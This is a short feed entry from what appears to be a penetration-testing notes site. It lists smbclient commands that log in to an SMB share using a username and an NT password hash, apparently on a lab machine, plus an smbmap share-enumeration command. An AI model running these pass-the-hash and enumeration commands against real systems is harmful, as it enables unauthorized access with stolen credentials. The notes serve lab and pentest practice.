channel.title: Smbclient on pentest notes

item.title: SMB
item.description: smbclient #user % hash smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -W YPUFFY -L 10.10.10.107 #Allow to login to smb share smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -W YPUFFY \\\\10.10.10.107\\alice smbmap smbmap -H 10.10.10.10 -u test -p 'test' -d domain.com
